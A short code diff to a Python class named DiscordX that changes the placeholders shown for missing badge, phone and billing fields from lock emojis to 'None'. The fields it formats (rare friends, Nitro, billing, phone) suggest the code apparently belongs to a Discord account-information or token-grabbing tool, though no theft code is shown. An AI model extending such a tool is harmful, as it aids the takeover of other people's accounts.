@@ -270,7 +270,7 @@ class DiscordX(): #Updating soon
         if friends == "":
             friends = "No Rare Friends"
         if not billing:
-            badge, phone, billing = "🔒", "🔒", "🔒"
+            badge, phone, billing = "None", "None", "None"
         if nitro == "" and badge == "":
             nitro = "?"
 
